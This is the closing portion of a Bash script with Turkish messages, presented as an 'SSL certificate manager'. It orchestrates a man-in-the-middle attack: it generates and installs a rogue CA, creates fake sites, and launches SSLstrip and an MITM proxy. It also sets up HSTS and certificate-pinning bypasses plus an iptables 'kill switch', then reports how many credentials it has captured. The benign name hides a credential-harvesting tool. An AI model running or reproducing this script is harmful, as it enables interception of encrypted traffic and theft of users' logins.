    print_status "SSL yönetici durumu kontrol ediliyor..."
    
    # Sertifika durumu
    if [ ${#CERT_INFO[@]} -gt 0 ]; then
        print_success "Oluşturulan sertifikalar:"
        for cert_type in "${!CERT_INFO[@]}"; do
            echo -e "  ${CYAN}$cert_type:${NC} ${CERT_INFO[$cert_type]}"
        done
    fi
    
    # Süreç durumları
    if [ -n "$APACHE_PID" ] && kill -0 "$APACHE_PID" 2>/dev/null; then
        print_success "Apache HTTPS sunucusu çalışıyor (PID: $APACHE_PID)"
    elif [ "$START_HTTPS_SERVER" = true ]; then
        print_error "Apache HTTPS sunucusu çalışmıyor"
    fi
    
    if [ -n "$NGINX_PID" ] && kill -0 "$NGINX_PID" 2>/dev/null; then
        print_success "Nginx HTTPS sunucusu çalışıyor (PID: $NGINX_PID)"
    elif [ "$START_HTTPS_SERVER" = true ]; then
        print_error "Nginx HTTPS sunucusu çalışmıyor"
    fi
    
    if [ -n "$SSLSTRIP_PID" ] && kill -0 "$SSLSTRIP_PID" 2>/dev/null; then
        print_success "SSLstrip çalışıyor (PID: $SSLSTRIP_PID)"
    elif [ "$START_SSLSTRIP" = true ]; then
        print_error "SSLstrip çalışmıyor"
    fi
    
    if [ -n "$MITM_PID" ] && kill -0 "$MITM_PID" 2>/dev/null; then
        print_success "MITM proxy çalışıyor (PID: $MITM_PID)"
    elif [ "$START_MITM_PROXY" = true ]; then
        print_error "MITM proxy çalışmıyor"
    fi
    
    # İstatistikler
    echo
    print_status "İstatistikler:"
    echo -e "  ${CYAN}Oluşturulan sertifika:${NC} $CERTS_CREATED"
    
    if [ -f "$OUTPUT_DIR/captured_credentials.log" ]; then
        local cred_count=$(wc -l < "$OUTPUT_DIR/captured_credentials.log")
        echo -e "  ${CYAN}Yakalanan kimlik bilgisi:${NC} $cred_count"
    fi
    
    if [ ${#FAKE_SITES[@]} -gt 0 ]; then
        echo -e "  ${CYAN}Sahte site sayısı:${NC} ${#FAKE_SITES[@]}"
    fi
    
    echo
}

# Temizlik
cleanup() {
    print_status "Temizlik yapılıyor..."
    
    # Süreçleri sonlandır
    for pid_var in APACHE_PID NGINX_PID SSLSTRIP_PID MITM_PID; do
        local pid=${!pid_var}
        if [ -n "$pid" ]; then
            kill "$pid" 2>/dev/null
            print_status "$pid_var sonlandırıldı"
        fi
    done
    
    # PID dosyalarından süreçleri sonlandır
    for pid_file in "$OUTPUT_DIR"/*.pid; do
        if [ -f "$pid_file" ]; then
            local pid=$(cat "$pid_file")
            kill "$pid" 2>/dev/null
            rm -f "$pid_file"
        fi
    done
    
    # SSL kill switch kaldır
    if [ "$SSL_KILL_SWITCH" = true ]; then
        iptables -D OUTPUT -p tcp --dport 443 -j DROP 2>/dev/null
        iptables -D FORWARD -p tcp --dport 443 -j DROP 2>/dev/null
        
        for port in 993 995 465 587 636 989 990; do
            iptables -D OUTPUT -p tcp --dport $port -j DROP 2>/dev/null
            iptables -D FORWARD -p tcp --dport $port -j DROP 2>/dev/null
        done
        
        print_status "SSL kill switch kaldırıldı"
    fi
    
    print_success "Temizlik tamamlandı"
}

# Ana fonksiyon
main() {
    echo
    print_status "SSL sertifika yöneticisi başlatılıyor..."
    echo
    
    # Gerekli araçları kontrol et
    check_dependencies
    
    # Dizinleri hazırla
    setup_directories
    
    # Parametreleri göster
    print_status "SSL yönetici parametreleri:"
    echo -e "  ${CYAN}Domain:${NC} $DOMAIN"
    echo -e "  ${CYAN}Sertifika Dizini:${NC} $CERT_DIR"
    echo -e "  ${CYAN}Çıktı Dizini:${NC} $OUTPUT_DIR"
    echo -e "  ${CYAN}CA Oluştur:${NC} $([ "$CREATE_CA" = true ] && echo "Evet" || echo "Hayır")"
    echo -e "  ${CYAN}Sunucu Sertifikası:${NC} $([ "$CREATE_SERVER_CERT" = true ] && echo "Evet" || echo "Hayır")"
    echo -e "  ${CYAN}Wildcard Sertifika:${NC} $([ "$WILDCARD_CERT" = true ] && echo "Evet" || echo "Hayır")"
    echo -e "  ${CYAN}HTTPS Sunucusu:${NC} $([ "$START_HTTPS_SERVER" = true ] && echo "Evet" || echo "Hayır")"
    echo -e "  ${CYAN}SSLstrip:${NC} $([ "$START_SSLSTRIP" = true ] && echo "Evet" || echo "Hayır")"
    echo -e "  ${CYAN}MITM Proxy:${NC} $([ "$START_MITM_PROXY" = true ] && echo "Evet" || echo "Hayır")"
    echo
    
    # Onay al (otomatik yükleme değilse)
    if [ "$AUTO_INSTALL" = false ]; then
        read -p "SSL sertifika işlemlerini başlatmak istiyor musunuz? (y/N): " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            print_status "İşlem iptal edildi"
            exit 0
        fi
    fi
    
    # Sertifikaları oluştur
    create_ca_certificate
    create_server_certificate
    create_client_certificate
    
    # CA'yı yükle
    install_ca_certificate
    
    # Sahte siteler oluştur
    create_fake_sites
    
    # Sunucuları başlat
    start_https_server
    start_sslstrip
    start_mitm_proxy
    
    # Güvenlik bypass'ları
    setup_ssl_kill_switch
    setup_hsts_bypass
    setup_cert_pinning_bypass
    
    # Durum kontrolü
    check_status
    
    print_success "SSL sertifika yöneticisi kurulumu tamamlandı!"
    
    echo
    print_status "Kullanım bilgileri:"
    echo -e "  ${CYAN}CA Sertifikası:${NC} $CA_DIR/ca.crt"
    echo -e "  ${CYAN}Sunucu Sertifikası:${NC} $SERVER_DIR/${DOMAIN}.crt"
    echo -e "  ${CYAN}Log Dosyası:${NC} $LOG_FILE"
    echo -e "  ${CYAN}Yakalanan Veriler:${NC} $OUTPUT_DIR/captured_credentials.log"
    echo -e "  ${CYAN}Durum Kontrolü:${NC} $0 --status"
    echo -e "  ${CYAN}Temizlik:${NC} $0 --cleanup"
    echo
}

# Özel komutlar
if [ "$1" = "--status" ]; then
    check_status
    exit 0
elif [ "$1" = "--cleanup" ]; then
    cleanup
    exit 0
fi

# Sinyal yakalama
trap cleanup EXIT INT TERM

# Komut satırı argümanlarını işle
parse_arguments "$@"

# Ana fonksiyonu çalıştır
main